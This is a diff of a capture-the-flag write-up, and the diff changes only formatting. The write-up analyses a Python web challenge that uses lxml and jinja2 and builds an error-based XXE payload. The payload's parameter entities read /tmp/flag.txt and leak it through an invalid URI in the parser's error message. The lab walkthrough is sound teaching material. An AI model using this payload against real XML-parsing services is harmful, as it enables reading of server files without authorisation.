@@ -37,6 +37,7 @@ Follow me on [Twitter](https://twitter.com/_CryptoCat) and [LinkedIn](https://ww
 Starting with the server setup code, we see that the flag is places in the `/tmp` directory, along with a folder of `templates` and `xml` files.
 
 {% code overflow="wrap" %}
+
 ```python
 os.chdir("/tmp/")
 os.makedirs("templates", exist_ok=True)
@@ -45,11 +46,13 @@ os.makedirs("xml", exist_ok=True)
 with open("flag.txt", "w") as f:
     f.write(flag)
 ```
+
 {% endcode %}
 
 There's a sample XML file and DTD.
 
 {% code overflow="wrap" %}
+
 ```python
 with open("xml/sample.xml", 'w') as f:
     f.write('''
@@ -75,11 +78,13 @@ with open("xml/config.dtd", 'w') as f:
 %config_hex;
 ''')
 ```
+
 {% endcode %}
 
 An `index.tpl` file is generated, I'll skip most of the CSS/HTML which does not seem relevant.
 
 {% code overflow="wrap" %}
+
 ```html
 <div class="content">
     <h2>Extracted Color Palette</h2>
@@ -93,6 +98,7 @@ An `index.tpl` file is generated, I'll skip most of the CSS/HTML which does not 
     </div>
 </div>
 ```
+
 {% endcode %}
 
 #### challenge.py
@@ -100,22 +106,26 @@ An `index.tpl` file is generated, I'll skip most of the CSS/HTML which does not 
 Now onto the challenge code. It imports `jinja2` and `lxml` which should make us think of SSTI and/or XXE vulnerabilities. It specifically loads version `5.3.2` of `lxml` so checking if it's the latest version or there are known vulnerabilities should be added to our TODO list.
 
 {% code overflow="wrap" %}
+
 ```python
 from jinja2 import Environment, FileSystemLoader
 lxml = import_v("lxml", "5.3.2")
 from lxml import etree
 ```
+
 {% endcode %}
 
 Next, the template is loaded. The `autoescape` option will prevent XSS by escaping HTML variables.
 
 {% code overflow="wrap" %}
+
 ```python
 template = Environment(
     autoescape=True,
     loader=FileSystemLoader('/tmp/templates'),
 ).get_template('index.tpl')
 ```
+
 {% endcode %}
 
 A `parse_palette` function is declared. First thing to note is it's susceptibility to XXE attacks:
@@ -124,6 +134,7 @@ A `parse_palette` function is declared. First thing to note is it's susceptibili
 -   `resolve_entities=True` → allows expanding general and parameter entities.
 
 {% code overflow="wrap" %}
+
 ```python
 def parse_palette(xml_data):
     parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
@@ -138,6 +149,7 @@ def parse_palette(xml_data):
 
     return list(colors)
 ```
+
 {% endcode %}
 
 However, there is some regex on the XML elements to ensure they match a hex colour code format. It must start with a `#`, followed by 3-6 hex characters e.g. `#1337` or `#420420`.
@@ -145,6 +157,7 @@ However, there is some regex on the XML elements to ensure they match a hex colo
 There's one more function; `promptFromXML`. It simply takes a string and passes it to the `parse_palette` function we just looked at.
 
 {% code overflow="wrap" %}
+
 ```python
 def promptFromXML(s: str):
     if not s:
@@ -152,11 +165,13 @@ def promptFromXML(s: str):
 
     return "Pallet successfully extracted", parse_palette(s)
 ```
+
 {% endcode %}
 
 Finally, the script ties it all together. It takes our user input (note this is URL-encoded by the WAF, hence the `unquote`) and passes it to the `promptFromXML` function. The parsed colours will be returned and then rendered using `template.render`.
 
 {% code overflow="wrap" %}
+
 ```python
 data = unquote("USER_INPUT_GOES_HERE")
 
@@ -168,6 +183,7 @@ except Exception as e:
 
 print(template.render(output=parsed_text, colors=colors, image=None))
 ```
+
 {% endcode %}
 
 ### Testing functionality
@@ -175,6 +191,7 @@ print(template.render(output=parsed_text, colors=colors, image=None))
 The `setup.py` code provided a sample XML file. It's a good idea to test it first, just to visualise the intended functionality of the app.
 
 {% code overflow="wrap" %}
+
 ```xml
 <!DOCTYPE colors [
     <!ELEMENT colors (color*)>
@@ -185,11 +202,12 @@ The `setup.py` code provided a sample XML file. It's a good idea to test it firs
     <color>#420420</color>
 </colors>
 ```
+
 {% endcode %}
 
 The colours are "successfully extracted" from our XML input and rendered in the template.
 
-![image](./images/0.PNG)
+![](./images/0.PNG)
 
 If we can exploit an XXE vulnerability to read `flag.txt`, we'll need to either:
 
@@ -215,6 +233,7 @@ However..
 > libxml doesn't restrict Parameter Entities, that leads to XXE:
 
 {% code overflow="wrap" %}
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE msg [
@@ -227,6 +246,7 @@ However..
 ]>
 <msg>&c;</msg>
 ```
+
 {% endcode %}
 
 The challenge meets both conditions:
@@ -239,6 +259,7 @@ The challenge meets both conditions:
 Can we do something similar? Let's try and swap out the values.
 
 {% code overflow="wrap" %}
+
 ```xml
 <!DOCTYPE colors [
 	<!ENTITY % a '
@@ -250,6 +271,7 @@ Can we do something similar? Let's try and swap out the values.
 ]>
 <colors><color>&c;</color></colors>
 ```
+
 {% endcode %}
 
 1. `%file;` reads `/tmp/flag.txt` (still allowed for parameter entities).
@@ -257,7 +279,7 @@ Can we do something similar? Let's try and swap out the values.
 3. When the parser meets `&c;` it tries to fetch that URI but fails and raises an error (apparently `meow` is not a real protocol 🙀).
 4. The wrapper catches the exception and prints it: `Error : Invalid URI: meow://FLAG{.*}`.
 
-![image](./images/1.PNG)
+![](./images/1.PNG)
 
 It worked! We get the flag: `FLAG{3rr0r_B4s3d_XX3_w1th_Sw4G}` 😎
 
